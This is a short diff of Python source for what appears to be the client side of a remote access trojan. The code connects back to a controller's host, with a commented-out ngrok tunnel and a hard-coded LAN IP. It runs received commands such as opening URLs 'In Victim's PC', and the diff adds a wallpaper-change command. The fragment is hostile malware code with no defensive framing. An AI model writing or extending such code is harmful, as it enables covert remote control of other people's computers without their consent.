@@ -43,6 +43,10 @@ class Client():
             _,_URL_TO_OPEN=self.command.split()
             webbrowser.open(_URL_TO_OPEN)
             self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
+        # Change Wallpaper
+        if self.command.startswith("change_wallpaper"):
+            _,_WALLPAPER_TO_CHANGE=self.command.split()
+            print(_WALLPAPER_TO_CHANGE)
     @property
     def os_name(self) -> str:
         if sys.platform=="win32":
@@ -64,5 +68,5 @@ class Client():
         return c,_addr
 if __name__ == "__main__":
     # c,addr=Client.init_socket("0.tcp.in.ngrok.io",13592)
-    c,addr=Client.init_socket("localhost",9999)
+    c,addr=Client.init_socket("192.168.29.94",9999)
     client=Client(c,addr)
